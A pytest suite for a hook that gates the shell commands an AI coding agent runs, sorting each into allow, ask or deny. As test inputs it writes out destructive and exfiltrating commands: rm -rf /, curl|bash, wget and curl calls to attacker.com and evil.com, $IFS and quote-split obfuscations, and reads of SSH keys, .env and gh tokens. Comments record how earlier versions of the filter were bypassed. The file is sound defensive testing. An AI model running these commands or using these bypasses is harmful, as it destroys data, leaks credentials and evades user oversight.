"""Unit tests for hooks/permission_policy.py — auto allow/deny/ask decisions.

WHY: permission_policy is the security gate for every command Claude executes.
A bug here silently allows dangerous commands or blocks safe ones.
"""

import io
import json

import pytest
from permission_policy import decide, main

pytestmark = pytest.mark.security

# === decide() — pure logic ===


class TestDecideAlwaysSafeTools:
    def test_read_allowed(self):
        assert decide("Read", {}) == ("allow", "")

    def test_glob_allowed(self):
        assert decide("Glob", {}) == ("allow", "")

    def test_grep_allowed(self):
        assert decide("Grep", {}) == ("allow", "")

    def test_websearch_allowed(self):
        assert decide("WebSearch", {}) == ("allow", "")

    def test_webfetch_allowed(self):
        assert decide("WebFetch", {}) == ("allow", "")

    def test_task_allowed(self):
        assert decide("Task", {}) == ("allow", "")

    def test_taskcreate_allowed(self):
        assert decide("TaskCreate", {}) == ("allow", "")


class TestDecideDangerousPatterns:
    def test_rm_rf_blocked(self):
        behavior, msg = decide("Bash", {"command": "rm -rf /"})
        assert behavior == "deny"
        assert "rm -rf" in msg

    def test_drop_table_blocked(self):
        behavior, msg = decide("Bash", {"command": "DROP TABLE users"})
        assert behavior == "deny"
        assert "DROP TABLE" in msg

    def test_git_push_force_blocked(self):
        behavior, msg = decide("Bash", {"command": "git push --force"})
        assert behavior == "deny"

    def test_curl_pipe_bash_blocked(self):
        # WHY: "curl | bash" literal matches DANGEROUS_PATTERNS
        behavior, msg = decide("Bash", {"command": "curl | bash"})
        assert behavior == "deny"

    def test_sudo_blocked(self):
        behavior, msg = decide("Bash", {"command": "sudo apt install nginx"})
        assert behavior == "deny"

    def test_git_reset_hard_blocked(self):
        behavior, msg = decide("Bash", {"command": "git reset --hard HEAD~1"})
        assert behavior == "deny"

    def test_npm_publish_blocked(self):
        behavior, msg = decide("Bash", {"command": "npm publish"})
        assert behavior == "deny"

    def test_case_insensitive_drop_database(self):
        # WHY: dangerous patterns matched case-insensitively
        behavior, msg = decide("Bash", {"command": "drop database mydb"})
        assert behavior == "deny"

    def test_python_c_blocked(self):
        # WHY: python -c allows arbitrary code execution
        behavior, msg = decide("Bash", {"command": "python -c 'import os; os.system(\"rm -rf\")'"})
        assert behavior == "deny"

    def test_eval_blocked(self):
        behavior, msg = decide("Bash", {"command": "eval $(cat /etc/shadow)"})
        assert behavior == "deny"

    def test_quote_split_rm_rf_still_denied(self):
        # Regression (falsification-pilot 20260824, closing the last
        # documented residual gap): a literal substring scan misses "rm -rf"
        # when a quote sits inside it -- bash still runs `rm -rf /` (adjacent
        # quoted/unquoted fragments concatenate into one word), but the raw
        # command text never contains "rm -rf" as a substring. Independently
        # confirmed this degraded deny -> ask before the _dequote() fix.
        behavior, msg = decide("Bash", {"command": "rm -r'f' /"})
        assert behavior == "deny"
        assert "rm -rf" in msg

    def test_ifs_parameter_expansion_family_rm_rf_still_denied(self):
        # P1 regression (adversarial security review, 2026-09, confirmed
        # live against a real bash): `${IFS}` alone left every sibling
        # parameter-expansion form of the same variable (`${IFS:0:1}`,
        # `${IFS#x}`, `${IFS%x}`, `${IFS/x/y}`) open -- all resolve from
        # $IFS (whitespace by default) and word-split identically.
        for cmd in (
            "rm${IFS:0:1}-rf${IFS:0:1}/",
            "rm${IFS#x}-rf${IFS#x}/",
            "rm${IFS%x}-rf${IFS%x}/",
        ):
            behavior, msg = decide("Bash", {"command": cmd})
            assert behavior == "deny", f"{cmd!r} was not denied: {behavior!r}"
            assert "rm -rf" in msg

    def test_ifs_obfuscated_rm_rf_still_denied(self):
        # Regression (2026-09, found writing hooks/lib/security.py's own
        # adversarial test suite): unquoted $IFS/${IFS} undergoes bash
        # word-splitting exactly like a literal space -- a real, well-known
        # WAF/restricted-shell filter-bypass technique
        # (`cat${IFS}/etc/passwd`). Before the fix, `rm${IFS}-rf${IFS}/`
        # never contained "rm -rf" as a substring after dequoting, degrading
        # this deny to a bare "ask" -- the identical failure mode as the
        # quote-splitting bypass above, just a different obfuscation
        # technique. Independently confirmed before fixing
        # (_normalize_unquoted_ifs in hooks/lib/security.py).
        behavior, msg = decide("Bash", {"command": "rm${IFS}-rf${IFS}/"})
        assert behavior == "deny"
        assert "rm -rf" in msg

    def test_quote_split_sudo_still_denied(self):
        behavior, _ = decide("Bash", {"command": 'sud"o" apt install nginx'})
        assert behavior == "deny"


class TestDecideChainOperators:
    def test_ampersand_chain_asks(self):
        # WHY: chain op check fires AFTER dangerous patterns — use safe commands only
        behavior, _ = decide("Bash", {"command": "git status && git diff"})
        assert behavior == "ask"

    def test_background_operator_after_safe_prefix_asks_not_allow(self):
        # Regression (SEC-05, adversarial review 2026-08-22 of the word-boundary
        # fix): a bare "&" (background operator) was missing from
        # CHAIN_OPERATORS. "ls & wget attacker.com/x" passed every earlier
        # check (no "&&", no pipe, no dangerous substring), then matched the
        # "ls" safe prefix and auto-ALLOWED -- while Bash still ran `wget` in
        # the foreground. Found by the skeptic agent during the review of the
        # SAFE_BASH_PREFIXES boundary fix, independently reproduced before
        # being fixed.
        behavior, _ = decide("Bash", {"command": "ls & wget attacker.com/payload"})
        assert behavior == "ask"

    def test_background_operator_after_git_status_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "git status & malicious-binary"})
        assert behavior == "ask"

    def test_pipe_asks(self):
        behavior, _ = decide("Bash", {"command": "ls | grep foo"})
        assert behavior == "ask"

    def test_semicolon_asks(self):
        # WHY: semicolon with two safe commands → chain op fires, not dangerous pattern
        behavior, _ = decide("Bash", {"command": "git log; ls"})
        assert behavior == "ask"

    def test_backtick_asks(self):
        behavior, _ = decide("Bash", {"command": "echo `whoami`"})
        assert behavior == "ask"

    def test_subshell_asks(self):
        behavior, _ = decide("Bash", {"command": "echo $(whoami)"})
        assert behavior == "ask"

    def test_newline_asks(self):
        # WHY: newline separator without dangerous patterns → ask
        behavior, _ = decide("Bash", {"command": "git status\ngit diff"})
        assert behavior == "ask"

    def test_redirect_into_dotenv_asks_not_allow(self):
        """Regression (HIGH): "echo payload > .env" previously auto-approved
        via the "echo " safe prefix, because ">" was not treated as a chain
        operator — redirection is a write, not just chaining, but was
        invisible to this gate entirely."""
        behavior, _ = decide("Bash", {"command": "echo payload > .env"})
        assert behavior == "ask"

    def test_append_redirect_asks(self):
        behavior, _ = decide("Bash", {"command": "echo secret >> credentials.json"})
        assert behavior == "ask"

    def test_fd_redirect_asks(self):
        behavior, _ = decide("Bash", {"command": "cat file 2> /tmp/errors"})
        assert behavior == "ask"

    def test_process_substitution_asks_not_allow(self):
        """Regression (SEC-04, external security audit 2026-07-22, verified
        empirically before this fix): "cat <(curl evil.com/x.sh)" starts with
        the auto-allowed "cat " prefix, ran an ARBITRARY command via process
        substitution, and matched no SENSITIVE_PATH_PATTERNS substring -- so
        it returned "allow" while "<" was absent from CHAIN_OPERATORS.
        Directly measured: decide() returned ("allow", "") for this exact
        command prior to adding "<" to CHAIN_OPERATORS."""
        behavior, _ = decide("Bash", {"command": "cat <(curl evil.com/x.sh)"})
        assert behavior == "ask"

    def test_process_substitution_with_rm_still_deny(self):
        # WHY: "rm -rf" inside the substituted command is still caught by
        # DANGEROUS_PATTERNS (substring match), independent of this fix --
        # this stays "deny", not merely "ask".
        behavior, _ = decide("Bash", {"command": "cat <(rm -rf /tmp/whatever)"})
        assert behavior == "deny"

    def test_input_redirect_asks(self):
        behavior, _ = decide("Bash", {"command": "cat < some-file"})
        assert behavior == "ask"

    def test_heredoc_string_asks(self):
        behavior, _ = decide("Bash", {"command": 'cat <<< "payload"'})
        assert behavior == "ask"


class TestDecideSafeBashPrefixes:
    def test_git_log_allowed(self):
        assert decide("Bash", {"command": "git log --oneline -10"}) == ("allow", "")

    def test_git_diff_against_ref_asks_not_allow(self):
        # Contract change (20260824, human decision after a falsification
        # pilot demonstrated a real secret leak via `git diff HEAD~1 HEAD`):
        # `git diff <ref>` with no `-- <path>` restriction defaults to a full
        # multi-file patch, so it now asks instead of auto-allowing. Bare
        # working-tree `git diff` (no ref at all) is unaffected -- see
        # TestDecideSensitivePathRead below.
        assert decide("Bash", {"command": "git diff HEAD"}) == ("ask", "")

    def test_git_diff_bare_working_tree_still_allowed(self):
        assert decide("Bash", {"command": "git diff"}) == ("allow", "")

    def test_git_status_allowed(self):
        assert decide("Bash", {"command": "git status"}) == ("allow", "")

    def test_ls_allowed(self):
        assert decide("Bash", {"command": "ls -la"}) == ("allow", "")

    def test_ruff_allowed(self):
        assert decide("Bash", {"command": "ruff check ."}) == ("allow", "")

    def test_mypy_allowed(self):
        assert decide("Bash", {"command": "mypy hooks/"}) == ("allow", "")

    def test_unknown_command_asks(self):
        behavior, _ = decide("Bash", {"command": "docker run nginx"})
        assert behavior == "ask"

    def test_non_bash_unknown_tool_asks(self):
        behavior, _ = decide("Edit", {"file_path": "foo.py"})
        assert behavior == "ask"

    def test_empty_command_asks(self):
        behavior, _ = decide("Bash", {"command": ""})
        assert behavior == "ask"


class TestSafePrefixWordBoundary:
    """Regression (MEDIUM, self-audit 2026-08-22): SAFE_BASH_PREFIXES entries that
    don't end in a space (ruff/mypy/ls/pwd/git status/...) previously matched via
    bare startswith(), so any command merely STARTING WITH the prefix auto-allowed
    -- the same bypass class SEC-01 (2026-07-17) already removed pytest/npm-test
    for. `_matches_safe_prefix` now requires the match end at a word boundary."""

    def test_lsof_does_not_match_ls_prefix(self):
        behavior, _ = decide("Bash", {"command": "lsof -i :8080"})
        assert behavior == "ask"

    def test_ruffian_does_not_match_ruff_prefix(self):
        behavior, _ = decide("Bash", {"command": "ruffian --do-something-else"})
        assert behavior == "ask"

    def test_mypyc_does_not_match_mypy_prefix(self):
        behavior, _ = decide("Bash", {"command": "mypyc hooks/permission_policy.py"})
        assert behavior == "ask"

    def test_pwd_lookalike_does_not_match_pwd_prefix(self):
        behavior, _ = decide("Bash", {"command": "pwdx 1234"})
        assert behavior == "ask"

    def test_git_status_lookalike_does_not_match(self):
        behavior, _ = decide("Bash", {"command": "git statuses-are-fake"})
        assert behavior == "ask"

    def test_bare_prefix_with_no_arguments_still_allowed(self):
        # WHY: the boundary check must accept an exact match (nothing after
        # the prefix at all), not just "prefix + space".
        behavior, _ = decide("Bash", {"command": "pwd"})
        assert behavior == "allow"

    def test_prefix_with_space_and_args_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "ls -la /tmp"})
        assert behavior == "allow"

    def test_git_status_with_flag_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "git status --short"})
        assert behavior == "allow"


class TestDecideSensitivePathRead:
    """Regression (HIGH, external security audit 2026-07-07): cat/head/tail
    were auto-allowed for ANY target path, including secrets -- `cat
    ~/.ssh/id_rsa` or `cat .env` had no chain operator and started with the
    auto-allowed "cat " prefix, so real credentials could be disclosed into
    Claude's context with zero confirmation."""

    def test_cat_ssh_key_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "cat ~/.ssh/id_rsa"})
        assert behavior == "ask"

    def test_cat_dotenv_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "cat .env"})
        assert behavior == "ask"

    def test_quote_split_cat_dotenv_still_asks(self):
        # Regression (closes the last documented residual gap from the
        # 20260824 permission_policy pilots): bash concatenates adjacent
        # quoted/unquoted fragments into one word, so `cat '.e'nv` and
        # `cat .env` execute identically -- confirmed byte-for-byte in a
        # throwaway repo -- but only the second contains ".env" as a literal
        # substring. Independently confirmed this auto-ALLOWED before the
        # _dequote() fix.
        behavior, _ = decide("Bash", {"command": "cat '.e'nv"})
        assert behavior == "ask"

    def test_quote_split_git_show_dotenv_still_asks(self):
        behavior, _ = decide("Bash", {"command": "git show HEAD:'.e'nv"})
        assert behavior == "ask"

    def test_quote_split_does_not_break_ordinary_quoted_commands(self):
        # WHY: _dequote() must not become a new source of false "ask" on
        # everyday quoted commands that contain no sensitive/dangerous
        # substring at all.
        assert decide("Bash", {"command": "echo 'hello world'"})[0] == "allow"
        assert decide("Bash", {"command": "git show HEAD:README.md"})[0] == "allow"

    def test_head_credentials_asks(self):
        behavior, _ = decide("Bash", {"command": "head -20 ~/.aws/credentials"})
        assert behavior == "ask"

    def test_tail_config_gh_hosts_asks(self):
        behavior, _ = decide("Bash", {"command": "tail ~/.config/gh/hosts.yml"})
        assert behavior == "ask"

    def test_cat_pem_file_asks(self):
        behavior, _ = decide("Bash", {"command": "cat server.pem"})
        assert behavior == "ask"

    def test_cat_ordinary_readme_still_allowed(self):
        """The sensitive-path check must not turn every cat into "ask" --
        ordinary, non-sensitive reads stay auto-allowed."""
        behavior, _ = decide("Bash", {"command": "cat README.md"})
        assert behavior == "allow"

    def test_cat_ordinary_source_file_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "cat hooks/utils.py"})
        assert behavior == "allow"

    def test_dangerous_pattern_still_beats_sensitive_path_check(self):
        # WHY: dangerous patterns are checked before sensitive-path check --
        # this must remain "deny", not downgrade to "ask".
        behavior, _ = decide("Bash", {"command": "cat .env; rm -rf /"})
        assert behavior == "deny"

    def test_wc_dotenv_asks_not_allow(self):
        # Regression (F-16, security audit 2026-07-12): "wc " was in
        # SAFE_BASH_PREFIXES but missing from _PATH_SENSITIVE_READ_PREFIXES,
        # so `wc -l .env` auto-allowed even though wc also reads arbitrary
        # file content (leaking byte/line/word counts of a secret file).
        behavior, _ = decide("Bash", {"command": "wc -l .env"})
        assert behavior == "ask"

    def test_wc_ssh_key_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "wc -c ~/.ssh/id_rsa"})
        assert behavior == "ask"

    def test_wc_ordinary_file_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "wc -l README.md"})
        assert behavior == "allow"

    def test_git_show_dotenv_asks_not_allow(self):
        # Regression (falsification-pilot 20260824, paraphrase-sensitivity
        # probe): "git show" is in SAFE_BASH_PREFIXES but was missing from
        # the sensitive-path check, so `git show HEAD:.env` auto-allowed even
        # though it dumps full file content from git history -- including
        # commits no longer present in the working tree.
        behavior, _ = decide("Bash", {"command": "git show HEAD:.env"})
        assert behavior == "ask"

    def test_git_log_patch_ssh_key_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "git log -p .ssh/id_rsa"})
        assert behavior == "ask"

    def test_git_diff_dotenv_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "git diff HEAD~1 -- .env"})
        assert behavior == "ask"

    def test_git_show_ordinary_file_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "git show HEAD:README.md"})
        assert behavior == "allow"

    def test_git_log_without_path_still_allowed_diff_against_ref_now_asks(self):
        assert decide("Bash", {"command": "git log --oneline -10"})[0] == "allow"
        # WHY "allow" -> "ask" (human decision, 20260824, explicit go-ahead
        # in-session): `git diff <ref>` with no `-- <path>` defaults to a
        # full multi-file patch -- reproduced live leaking a historical
        # secret via `git diff HEAD~1 HEAD`. See also
        # test_git_diff_against_ref_asks_not_allow in
        # TestDecideSafeBashPrefixes for the same contract change.
        assert decide("Bash", {"command": "git diff HEAD"})[0] == "ask"

    def test_git_show_bare_ref_asks_not_allow(self):
        # Regression (security-audit follow-up, same pilot): `git show <ref>`
        # with no ":<path>" defaults to the FULL commit patch -- every
        # changed file, none named in the command text. Reproduced live:
        # `git show HEAD~1` alone printed a secret from a since-removed
        # .env with zero filename in the command. No substring scan can
        # catch this; must ask whenever the command isn't narrowed to a
        # specific ":<path>".
        for cmd in ("git show HEAD", "git show HEAD~1", "git show a1b2c3d"):
            assert decide("Bash", {"command": cmd}) == ("ask", ""), cmd

    def test_git_log_patch_flag_asks_not_allow(self):
        # `git log` defaults to metadata-only (safe); -p/--patch/-u switch it
        # to full per-commit patches -- same unrestricted-dump risk as bare
        # `git show` above.
        for cmd in ("git log -p -3", "git log --patch", "git log -u"):
            assert decide("Bash", {"command": cmd}) == ("ask", ""), cmd

    def test_git_diff_bare_refs_asks_not_allow(self):
        # FIXED (human decision, 20260824, explicit go-ahead in-session):
        # `git diff <ref1> <ref2>` with no path restriction defaults to a
        # full multi-file patch, same risk class as the two cases above --
        # reproduced live leaking a historical secret with zero filename in
        # the command. Originally left open because it broke the
        # then-existing `git diff HEAD` -> allow contract; that contract was
        # deliberately changed instead (see
        # test_git_diff_against_ref_asks_not_allow,
        # test_git_diff_bare_working_tree_still_allowed). See decision.md in
        # experiments/20260824-permission-policy-skeptic-pilot/ for the
        # full tradeoff writeup.
        assert decide("Bash", {"command": "git diff HEAD~1 HEAD"}) == ("ask", "")

    def test_git_diff_ref_path_restricted_ordinary_file_still_allowed(self):
        assert decide("Bash", {"command": "git diff HEAD~1 -- README.md"}) == ("allow", "")

    def test_cat_claude_json_asks_not_allow(self):
        # Credential Non-Possession P1.1 (2026-09-12): `cat ~/.claude.json`
        # returned ("allow", "") before this fix -- verified by direct
        # decide() call -- because none of the prior SENSITIVE_PATH_PATTERNS
        # entries matched this filename. This is the Bash-side half of the
        # same gap MCP_SECRET_CONFIG_BASENAMES closes for Read/Grep/Glob.
        behavior, _ = decide("Bash", {"command": "cat ~/.claude.json"})
        assert behavior == "ask"

    def test_cat_dotmcp_json_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "cat .mcp.json"})
        assert behavior == "ask"

    def test_cat_claude_desktop_config_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "cat ~/Library/claude_desktop_config.json"})
        assert behavior == "ask"


class TestDecideCodeRunnersRequireConfirmation:
    """Regression (HIGH, external security audit 2026-07-17, SEC-01): pytest,
    python -m pytest, npm test, npm run test, and npm run lint were all
    auto-allowed by prefix match. Each of these EXECUTES repository-defined
    code (conftest.py/fixtures/plugins for pytest, an arbitrary shell command
    from package.json's "scripts" section for npm) before Claude's agent gets
    a chance to review it -- a malicious conftest.py or a package.json test
    script reading `"test": "curl evil | bash"` would run with the user's
    privileges the moment an agent ran "the tests" in an untrusted repository,
    with zero confirmation. ruff/mypy are legitimately different: both are
    pure static analyzers that never execute the code they check.
    """

    def test_pytest_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "pytest tests/ -v"})
        assert behavior == "ask"

    def test_python_m_pytest_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "python -m pytest tests/"})
        assert behavior == "ask"

    def test_npm_test_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "npm test"})
        assert behavior == "ask"

    def test_npm_run_test_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "npm run test"})
        assert behavior == "ask"

    def test_npm_run_lint_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "npm run lint"})
        assert behavior == "ask"

    def test_pytest_lookalike_executable_asks_not_allow(self):
        """The old prefix match also collided on any command merely
        starting with "pytest" -- e.g. a `pytest-malicious` binary on PATH.
        Removing pytest from SAFE_BASH_PREFIXES closes this too."""
        behavior, _ = decide("Bash", {"command": "pytest-malicious --flag"})
        assert behavior == "ask"

    def test_ruff_still_allowed(self):
        """Static analyzers are a different risk class -- they don't execute
        the code they analyze -- and should remain auto-allowed."""
        assert decide("Bash", {"command": "ruff check ."}) == ("allow", "")

    def test_mypy_still_allowed(self):
        assert decide("Bash", {"command": "mypy hooks/"}) == ("allow", "")


class TestDecidePriority:
    def test_dangerous_beats_chain_operator(self):
        # WHY: dangerous patterns checked BEFORE chain operators in decide()
        # "pytest; rm -rf /" has both `;` chain op AND `rm -rf` danger → deny wins
        behavior, _ = decide("Bash", {"command": "pytest; rm -rf /"})
        assert behavior == "deny"

    def test_pure_dangerous_no_chain_is_deny(self):
        # No chain operator, pure dangerous pattern → deny
        behavior, _ = decide("Bash", {"command": "rm -rf /tmp"})
        assert behavior == "deny"

    def test_chain_without_dangerous_is_ask(self):
        # WHY: chain op alone (no dangerous pattern) → ask, not deny
        behavior, _ = decide("Bash", {"command": "git status && git log"})
        assert behavior == "ask"


# === main() — via stdin ===


class TestMain:
    def _call_main(self, monkeypatch, data: dict) -> dict:
        monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(data)))
        from io import StringIO
        from unittest.mock import patch

        buf = StringIO()
        with patch("sys.stdout", buf):
            try:
                main()
            except SystemExit:
                pass
        output = buf.getvalue().strip()
        return json.loads(output) if output else {}

    def test_main_allows_safe_bash(self, monkeypatch):
        # WHY a real Bash command here specifically (regression, external
        # review 2026-07-18, SEC-03 follow-up): this test targets the Bash
        # code path. UPDATE (Credential Non-Possession P1.1, 2026-09-12):
        # the matcher below WAS "Bash" only when this comment was first
        # written, meaning a non-Bash tool_name never reached this hook in
        # production at that time -- the matcher is now "Bash|Read|Grep|Glob"
        # (see hooks/registry.yaml's own WHY comment), so Read/Grep/Glob DO
        # reach main() in production too. See TestMcpSecretConfigReadDenied
        # below for that path's own end-to-end main() coverage.
        # decide("Read", {}) itself is still covered directly by
        # TestDecideAlwaysSafeTools above.
        result = self._call_main(
            monkeypatch,
            {"tool_name": "Bash", "tool_input": {"command": "git status"}},
        )
        # Owner decision 2026-09-02: main() is SILENT on "allow" (and "ask"),
        # emitting only on "deny", so the static Bash(*) allow rule applies
        # with no dialog. The verdict itself is still "allow" -- asserted via
        # decide() directly -- it just no longer needs to be spoken.
        assert decide("Bash", {"command": "git status"})[0] == "allow"
        assert result == {}

    def test_main_deny_for_rm_rf(self, monkeypatch):
        result = self._call_main(
            monkeypatch,
            {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}},
        )
        output = result["hookSpecificOutput"]
        assert output["permissionDecision"] == "deny"
        assert "rm -rf" in output["permissionDecisionReason"]

    def test_main_asks_for_unknown_bash_command(self, monkeypatch):
        # WHY "docker run nginx" (a real, reachable Bash command), not
        # tool_name="UnknownTool" (same regression as test_main_allows_safe_bash
        # above): only unrecognized BASH commands reach this hook in
        # production, not arbitrary non-Bash tool names.
        result = self._call_main(
            monkeypatch,
            {"tool_name": "Bash", "tool_input": {"command": "docker run nginx"}},
        )
        # Owner decision 2026-09-02: "ask" is computed but NOT emitted -- an
        # "ask" from this hook raised a confirmation dialog on every routine
        # chained command across every open session, blocking unattended
        # solo work. Silent -> static Bash(*) allow applies. decide() still
        # returns "ask" for consumers that want that tier.
        assert decide("Bash", {"command": "docker run nginx"})[0] == "ask"
        assert result == {}

    def test_main_empty_stdin_no_crash(self, monkeypatch, capsys):
        monkeypatch.setattr("sys.stdin", io.StringIO("{}"))
        try:
            main()
        except SystemExit:
            pass
        # Should not raise, output may be minimal


class TestMainEmitsOnlyOnDeny:
    """Owner decision 2026-09-02: main() emits a permissionDecision ONLY for
    "deny". For "ask" and "allow" it stays silent, so the static `Bash(*)`
    allow rule applies and no confirmation dialog is raised. decide()'s
    three-way verdict is unchanged and still tested above -- this is about
    what reaches Claude Code, not about what decide() computes.

    WHY: the day this hook was re-wired from the dead PermissionRequest event
    to PreToolUse/Bash, every routine command with `&&`/`;`/`|` started
    prompting in every open session (decide() -> "ask"), blocking a solo
    developer who runs tasks unattended. See the solo-autonomy feedback memory.
    """

    def _run_main(self, monkeypatch, capsys, command: str) -> str:
        import io
        import json

        import permission_policy as pp

        payload = {"tool_name": "Bash", "tool_input": {"command": command}}
        monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(payload)))
        try:
            pp.main()
        except SystemExit:
            pass
        return capsys.readouterr().out

    def test_ask_verdict_emits_nothing(self, monkeypatch, capsys):
        # `&&` -> CHAIN_OPERATORS -> decide() returns "ask"
        assert decide("Bash", {"command": "git status && git diff"})[0] == "ask"
        out = self._run_main(monkeypatch, capsys, "git status && git diff")
        assert out.strip() == ""

    def test_allow_verdict_emits_nothing(self, monkeypatch, capsys):
        assert decide("Bash", {"command": "git status"})[0] == "allow"
        out = self._run_main(monkeypatch, capsys, "git status")
        assert out.strip() == ""

    def test_deny_verdict_still_emits(self, monkeypatch, capsys):
        import json

        assert decide("Bash", {"command": "sudo apt install nginx"})[0] == "deny"
        out = self._run_main(monkeypatch, capsys, "sudo apt install nginx")
        assert out.strip() != ""
        decision = json.loads(out.strip())["hookSpecificOutput"]
        assert decision["permissionDecision"] == "deny"


class TestSensitivePathReadEscalatedToDeny:
    """Credential Non-Possession Phase 1 kill analysis (2026-09-12, see
    docs/credential-broker-pilot-threat-model.md): DDD/skeptic/sec-auditor
    review of a proposed credential-broker pilot found -- independently
    confirmed by direct inspection of hooks/settings.json -- that decide()'s
    "ask" verdict for a sensitive-path read is silently dropped by
    TestMainEmitsOnlyOnDeny's own "emit only on deny" rule, making `cat .env`
    behave exactly like "allow" on this solo-autonomy machine. decide()
    itself stays "ask" (unchanged, still tested above -- other profiles that
    surface "ask" prompts still get one); main() now escalates JUST this one
    sensitive-path-read case to a hard, always-emitted "deny", leaving every
    other "ask" (chain operators, unknown commands) silently dropped exactly
    as before."""

    def _run_main(self, monkeypatch, capsys, command: str) -> str:
        import io
        import json

        import permission_policy as pp

        payload = {"tool_name": "Bash", "tool_input": {"command": command}}
        monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(payload)))
        try:
            pp.main()
        except SystemExit:
            pass
        return capsys.readouterr().out

    def _assert_denied(self, monkeypatch, capsys, command: str) -> None:
        import json

        assert decide("Bash", {"command": command})[0] == "ask", (
            "test setup: decide() must still return 'ask' for this command -- "
            "if it now returns 'deny' or 'allow', decide()'s own contract changed "
            "and this test needs to be re-examined, not just re-asserted"
        )
        out = self._run_main(monkeypatch, capsys, command)
        assert out.strip() != "", f"expected an emitted deny, got silence for: {command!r}"
        decision = json.loads(out.strip())["hookSpecificOutput"]
        assert decision["permissionDecision"] == "deny"

    def test_cat_dotenv_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "cat .env")

    def test_cat_ssh_key_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "cat ~/.ssh/id_rsa")

    def test_head_credentials_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "head -20 ~/.aws/credentials")

    def test_wc_dotenv_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "wc -l .env")

    def test_git_show_dotenv_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "git show HEAD:.env")

    def test_sensitive_read_combined_with_chain_operator_still_escalated(self, monkeypatch, capsys):
        """A sensitive-path read that ALSO has a chain operator hits
        CHAIN_OPERATORS first inside decide() (still "ask", unchanged) --
        main()'s own escalation check is independent of decide()'s internal
        branch order and must still catch it."""
        self._assert_denied(monkeypatch, capsys, "cat .env && echo done")

    def test_ordinary_ask_still_silent(self, monkeypatch, capsys):
        """Regression guard: this escalation must be narrowly scoped to
        sensitive-path reads only -- an ordinary chain-operator "ask" with no
        sensitive path must remain completely silent, exactly as
        TestMainEmitsOnlyOnDeny already established."""
        assert decide("Bash", {"command": "git status && git diff"})[0] == "ask"
        out = self._run_main(monkeypatch, capsys, "git status && git diff")
        assert out.strip() == ""

    def test_bare_git_show_not_escalated(self, monkeypatch, capsys):
        """Skeptic-found scope-creep bug (2026-09-12, fixed before merge):
        the first cut called `_reads_sensitive_path()` directly, which ALSO
        returns True for bare `git show <ref>` (unbounded blast radius, a
        DIFFERENT risk reason than 'names something secret-looking') --
        escalating that would have silently hard-blocked an extremely
        common, ordinary command with zero relation to credentials.
        `_names_a_sensitive_path()` must not fire for this shape; decide()
        itself is unchanged (still "ask", see test_git_show_bare_ref_asks_
        not_allow above)."""
        for cmd in ("git show HEAD", "git show HEAD~1", "git show a1b2c3d"):
            assert decide("Bash", {"command": cmd})[0] == "ask", cmd
            out = self._run_main(monkeypatch, capsys, cmd)
            assert out.strip() == "", f"wrongly escalated to deny: {cmd!r}"

    def test_bare_git_diff_not_escalated(self, monkeypatch, capsys):
        for cmd in ("git diff HEAD", "git diff HEAD~1 HEAD"):
            assert decide("Bash", {"command": cmd})[0] == "ask", cmd
            out = self._run_main(monkeypatch, capsys, cmd)
            assert out.strip() == "", f"wrongly escalated to deny: {cmd!r}"

    def test_git_log_patch_flag_not_escalated(self, monkeypatch, capsys):
        for cmd in ("git log -p -3", "git log --patch", "git log -u"):
            assert decide("Bash", {"command": cmd})[0] == "ask", cmd
            out = self._run_main(monkeypatch, capsys, cmd)
            assert out.strip() == "", f"wrongly escalated to deny: {cmd!r}"

    def test_git_diff_scoped_to_sensitive_path_still_escalated(self, monkeypatch, capsys):
        """The narrower predicate must still catch the case it's actually
        meant for: `git diff <refs> -- <path>` WITH a path restriction that
        names a sensitive file."""
        self._assert_denied(monkeypatch, capsys, "git diff HEAD~1 HEAD -- .env")

    def test_gh_auth_token_denied_via_position_anchored_regex(self, monkeypatch, capsys):
        """A different mechanism (`_GH_AUTH_TOKEN_RE`, hard deny at the
        decide() level, position-anchored like `_EVAL_COMMAND_RE`) -- not the
        sensitive-path escalation above -- closes the `gh auth token`
        disclosure path. Verified here as end-to-end main() behavior, same
        as the rest of this class."""
        for cmd in (
            "gh auth token",
            "echo hi && gh auth token",
            "foo; gh auth token",
            "x=$(gh auth token)",
            "gh auth status --show-token",
        ):
            assert decide("Bash", {"command": cmd})[0] == "deny", cmd
            out = self._run_main(monkeypatch, capsys, cmd)
            assert out.strip() != "", cmd
            import json

            decision = json.loads(out.strip())["hookSpecificOutput"]
            assert decision["permissionDecision"] == "deny"

    def test_gh_auth_token_prose_mention_not_denied(self, monkeypatch, capsys):
        """Skeptic-found false-positive bug (2026-09-12, confirmed by direct
        execution before fixing -- a bare-string DANGEROUS_PATTERNS entry
        would have blocked THIS VERY COMMIT'S own message): a bare substring
        scan cannot distinguish an actual `gh auth token` invocation from the
        phrase appearing inside a quoted argument to an unrelated command
        (a commit message, a grep pattern, an echo string). Fixed the same
        way `_EVAL_COMMAND_RE` already fixed the identical class of false
        positive for "eval": anchor on position (start of command, or
        immediately after a command-separator), not a bare substring."""
        for cmd in (
            'git commit -m "fix: block gh auth token disclosure"',
            'grep -r "gh auth token" hooks/',
            'echo "documenting gh auth token behavior"',
        ):
